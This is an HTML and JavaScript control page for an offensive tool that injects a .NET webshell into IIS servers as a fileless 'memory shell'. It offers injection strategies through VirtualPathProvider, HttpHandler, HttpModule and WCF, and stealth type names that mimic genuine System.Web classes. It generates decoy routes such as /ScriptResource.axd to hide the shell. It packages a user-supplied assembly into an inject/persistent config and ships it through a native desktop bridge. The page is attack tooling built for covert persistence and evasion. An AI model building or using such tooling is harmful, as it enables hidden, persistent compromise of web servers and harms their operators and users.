<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <title>C# MemoryShell Controller</title>
    <style>
        html, body {
            min-height: 100%;
            margin: 0;
            padding: 0;
            background-color: #000000;
            color: #ffffff;
            overflow-y: auto; 
            overflow-x: hidden;
        }

        body { 
            font-family: 'Courier New', Courier, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            box-sizing: border-box;
            padding: 20px;
        }
        
        .container { 
            width: 100%;
            max-width: 650px; 
            background: #000000; 
            padding: 25px; 
            border-radius: 0px;
            border: 1px solid #ffffff;
            box-sizing: border-box;
            margin: auto; 
        }

        h2 {
            color: #ffffff;
            margin-top: 0; 
            border-bottom: 1px solid #ffffff; 
            padding-bottom: 10px; 
            font-size: 18px; 
            text-transform: uppercase; 
            letter-spacing: 2px; 
        }

        h3 { 
            font-size: 13px; 
            color: #ffffff; 
            text-transform: uppercase; 
            margin-top: 25px; 
        }

        .status-bar { 
            background: #000000; 
            padding: 10px; 
            margin-bottom: 20px; 
            font-size: 12px; 
            border: 1px dashed #ffffff; 
            text-transform: uppercase; 
        }

        .badge { 
            padding: 0px 4px; 
            font-weight: bold; 
        }

        .badge-active { 
            background: #ffffff; 
            color: #000000; 
        }

        .badge-error { 
            border: 1px dashed #ffffff; 
            background: transparent; 
            color: #ffffff; 
        }

        .form-row { 
            display: flex; 
            gap: 15px; 
            margin-bottom: 15px; 
        }

        .form-group { 
            flex: 1; 
            margin-bottom: 15px; 
        }

        label { 
            display: block; 
            margin-bottom: 5px; 
            color: #ffffff; 
            text-transform: uppercase; 
            font-size: 12px; 
            font-weight: bold; 
        }

        input[type="text"], 
        textarea, 
        select { 
            width: 100%; 
            background: #000000; 
            border: 1px solid #ffffff; 
            color: #ffffff; 
            padding: 8px; 
            box-sizing: border-box; 
            font-family: inherit; 
            font-size: 13px; 
        }

        input[type="text"]:focus, 
        textarea:focus, 
        select:focus { 
            outline: none; 
            background: #111111; 
        }

        textarea { 
            height: 100px; 
            resize: vertical; 
        }

        select { 
            appearance: none; 
            -webkit-appearance: none; 
            background-image: url("data:image/svg+xml;utf8,<svg fill='white' height='24' viewBox='0 0 24 24' width='24' xmlns='http://www.w3.org/2000/svg'><path d='M7 10l5 5 5-5z'/></svg>"); 
            background-repeat: no-repeat; 
            background-position-x: 95%; 
            background-position-y: 50%; 
        }

        button { 
            background-color: transparent; 
            color: #ffffff; 
            font-weight: bold; 
            font-family: inherit; 
            border: 1px solid #ffffff; 
            padding: 10px 25px; 
            cursor: pointer; 
            text-transform: uppercase; 
            letter-spacing: 1px; 
            width: 100%; 
        }

        button:hover:not(:disabled) { 
            background-color: #ffffff; 
            color: #000000; 
        }

        button:disabled { 
            border-color: #444444; 
            color: #444444; 
            cursor: not-allowed; 
        }

        .console { 
            background: #000000; 
            border: 1px solid #ffffff; 
            padding: 15px; 
            height: 180px; 
            overflow-y: auto; 
            white-space: pre-wrap; 
            font-size: 13px; 
            line-height: 1.5; 
        }

        .msf-line { 
            margin-bottom: 4px; 
            color: #ffffff; 
        } 

        .msf-info { 
            color: #3498db; 
            font-weight: bold; 
        }

        .msf-success { 
            color: #2ecc71; 
            font-weight: bold; 
        }

        .msf-warn { 
            color: #f1c40f; 
            font-weight: bold; 
        }

        .msf-error { 
            color: #e74c3c; 
            font-weight: bold; 
        }
    </style>
</head>
<body>
<div class="container">
    <h2>[ .NET MemoryShell Controller ]</h2>
    <div class="status-bar" id="statusBar">[*] Initializing core controller... awaiting bridge...</div>
    
    <div class="form-group">
        <label>> Shell Type / IIS Strategy</label>
        <select id="shellType" onchange="updateDefaultConfig()">
            <option value="iis_virtualfile">IIS - VirtualPathProvider (ASPX Fileless)</option>
            <option value="iis_handler">IIS - HttpHandler Injector (ASHX Router)</option>
            <option value="iis_module">IIS - HttpModule WebEvent (Global Traffic Interpret)</option>
            <option value="wcf_soap">WCF / SOAP - Dynamic Endpoint</option>
        </select>
    </div>
    
    <div class="form-group">
        <label>> WebShell Assembly (.dll Target / Hex Format)</label>
        <textarea id="shellClassHex" oninput="updateJsonConfig()" placeholder=".NET Webshell script"></textarea>
    </div>
    
    <div class="form-row">
        <div class="form-group">
            <label>> Target Route / URL Pattern</label>
            <div style="display: flex; gap: 10px;">
                <input type="text" id="urlPattern" value="/ScriptResource.axd" oninput="updateJsonConfig()" style="flex: 1;">
                <button id="genRouteBtn" onclick="generateRandomRoute()" style="width: auto; padding: 0 15px; margin-top: 0; font-size: 11px;">GEN</button>
            </div>
        </div>
    </div>

    <div class="form-group">
        <label>> Stealth Virtual Typename</label>
        <input type="text" id="className" value="System.Web.Handlers.AssemblyResourceLoader" oninput="updateJsonConfig()">
    </div>

    <div class="form-group">
        <label>> Transmitted Config (JSON Target)</label>
        <input type="text" id="targetJson" value="" readonly style="background: #111; color: #aaa; border-color: #444;">
    </div>

    <button id="sendBtn" onclick="executePlugin()" disabled style="margin-top: 10px;">Deploy .NET MemoryShell Module</button>
    <h3>Console Output</h3>
    <div class="console" id="consoleOutput"></div>
</div>
<script>
    const pluginManifest = {
        "supportedLangs": [
            "ASPX/NebulaPulsar/DarkMatter",
            "ASHX/NebulaPulsar/DarkMatter",
            "ASMX/NebulaPulsar/DarkMatter"
        ]
    };

    const defaultConfigs = {
        iis_virtualfile: "System.Web.Handlers.AssemblyResourceLoader",
        iis_handler: "System.Web.SessionState.SessionStateModule",
        iis_module: "System.Web.Configuration.HttpModulesSection",
        wcf_soap: "System.ServiceModel.Activation.HttpHandler"
    };

    let currentShellType = "";

    function updateDefaultConfig() {
        const type = document.getElementById('shellType').value;
        document.getElementById('className').value = defaultConfigs[type] || "";
        appendLog("[*] IIS CONFIG MATRIX CHANGED TO: " + type.toUpperCase());
        updateJsonConfig();
    }

    function generateRandomRoute() {
        const folders = ["assets", "static", "vendor", "Scripts", "Content", "App_Data", "public", "api", "Services"];
        const subfolders = ["js", "css", "modules", "config", "bundles", "cache", "handlers", "logs"];
        const files = ["main", "app", "index", "init", "bootstrap", "WebResource", "ScriptResource", "loader", "handler"];
        
        const type = document.getElementById('shellType').value;
        let ext = ".aspx";
        if (type === "iis_handler") ext = ".ashx";
        if (type === "wcf_soap") ext = ".asmx";

        const f = folders[Math.floor(Math.random() * folders.length)];
        const sf = subfolders[Math.floor(Math.random() * subfolders.length)];
        const file = files[Math.floor(Math.random() * files.length)];

        let randomPath = "/";
        if (Math.random() > 0.3) {
            randomPath += f + "/" + sf + "/" + file + ext;
        } else {
            randomPath += f + "/" + file + ext;
        }

        document.getElementById('urlPattern').value = randomPath;
        appendLog("[+] .NET PSEUDO ROUTE GENERATED: " + randomPath);
        
        updateJsonConfig();
    }

    function updateJsonConfig() {
    const textarea = document.getElementById('shellClassHex');
    if (!textarea) return;

    const rawSourceText = textarea.value;
    
    let base64EncodedSource = "";
    if (rawSourceText.trim() !== "") {
        try {
            base64EncodedSource = btoa(unescape(encodeURIComponent(rawSourceText)));
        } catch(e) {
            base64EncodedSource = btoa(rawSourceText);
        }
    }

    const shellType = document.getElementById('shellType').value;
    const urlPattern = document.getElementById('urlPattern').value;
    const className = document.getElementById('className').value;
    
    const szParamStr = "action=INJECT&mode=persistent&platform=CSHARP&shellType=" + shellType + "&urlPattern=" + encodeURIComponent(urlPattern) + "&className=" + className;

    const configObj = {
        "strategy": "inject", 
        "platform": "CSHARP",
        "shellType": shellType,
        "shellClassHex": base64EncodedSource,
        "urlPattern": urlPattern,
        "className": className,
        "pulsarParam": szParamStr 
    };
    document.getElementById('targetJson').value = JSON.stringify(configObj);
}

    function appendLog(text) {
        const consoleOutput = document.getElementById('consoleOutput');
        if (!text) return;
        text.split('\n').forEach(line => {
            if (line.trim() === "") return;
            let div = document.createElement('div');
            div.className = 'msf-line';
            if (line.startsWith('[*]'))
                div.innerHTML = `<span class="msf-info">[*]</span> ${line.substring(3)}`;
            else if (line.startsWith('[+]'))
                div.innerHTML = `<span class="msf-success">[+]</span> ${line.substring(3)}`;
            else if (line.startsWith('[-]'))
                div.innerHTML = `<span class="msf-error">[-]</span> ${line.substring(3)}`;
            else if (line.startsWith('[!]'))
                div.innerHTML = `<span class="msf-warn">[!]</span> ${line.substring(3)}`;
            else
                div.innerText = line;
            consoleOutput.appendChild(div);
        });
        consoleOutput.scrollTop = consoleOutput.scrollHeight;
    }

    window.addEventListener('DOMContentLoaded', async () => {
        updateJsonConfig();
        
        const statusBar = document.getElementById('statusBar');
        const sendBtn = document.getElementById('sendBtn');
        
        try {
            if (window.chrome && window.chrome.webview && window.chrome.webview.hostObjects.nativeBridge) {
                const bridge = window.chrome.webview.hostObjects.nativeBridge;
                currentShellType = await bridge.fnGetShellType();
                
                if (pluginManifest.supportedLangs.includes(currentShellType) || currentShellType.toUpperCase().includes("CSHARP")) {
                    statusBar.innerHTML = `GATEWAY_ENV: <span class="badge badge-active">.NET CLR SPACE</span> // STATUS: PIPELINE READY`;
                    sendBtn.disabled = false;
                    appendLog("[*] LINK ESTABLISHED WITH NATIVE .NET DESKTOP BRIDGE.");
                    appendLog("[*] READY TO COMPILE AND SHIP CLR ASSEMBLY METADATA.");
                } else {
                    statusBar.innerHTML = `GATEWAY_ENV: <span class="badge badge-error">INCOMPATIBLE</span> // STATUS: ABORTED`;
                    appendLog(`[-] COMPILER ERROR: WORKSPACE MISMATCH.`);
                }
            } else {
                appendLog("[!] BRIDGE_NOT_FOUND. STANDALONE DRY-RUN MODE SIMULATION ACTIVE.");
                sendBtn.disabled = false;
            }
        } catch (e) {
            appendLog("[!] EXCEPTION_CAUGHT: " + e.message.toUpperCase());
        }
    });

    async function executePlugin() {
        const jsonConfig = document.getElementById('targetJson').value;
        const configParsed = JSON.parse(jsonConfig);
        
        if (!configParsed.shellClassHex) {
            appendLog("[-] ERROR: WebShell Assembly Hex data cannot be empty.");
            return;
        }
        
        appendLog(`[*] COMPILED DESCRIPTOR [PLATFORM: .NET // STRATEGY: ${configParsed.shellType.toUpperCase()}]`);
        appendLog(`[*] REGISTERING INJECTOR TO CORE INTERFACE PIPE...`);
        
        try {
            if (window.chrome && window.chrome.webview && window.chrome.webview.hostObjects.nativeBridge) {
                const bridge = window.chrome.webview.hostObjects.nativeBridge;
                const currentDir = window.location.pathname.substring(1, window.location.pathname.lastIndexOf('/') + 1);
                
                appendLog('[*] FETCHING TRANSIENT DEPLOYER FROM LOCAL DIRECTORY...');
                const payloadCode = await bridge.fnGetPayload(currentDir, currentShellType, "payload");
                
                appendLog('[*] HOT-SWAPPING BYTES INTO INTERFACE PIPELINE LAYER...');
                const result = await bridge.fnRun(jsonConfig, payloadCode, currentShellType);
                appendLog(result.toUpperCase());
            } else {
                appendLog(`[!] MOCK TRANSMITTING MZ BINARY TO INMEMORY IIS TARGET...`);
                setTimeout(() => { 
                    appendLog(`[+] MOCK STATUS: SUCCESS (TRANSMITTED ${configParsed.shellClassHex.length} HEX CHARS VIA DUMMY BRIDGE)`); 
                }, 600);
            }
        } catch (e) {
            appendLog("[-] TRANSMISSION FAULT: " + e.message.toUpperCase());
        }
    }
</script>
</body>
</html>
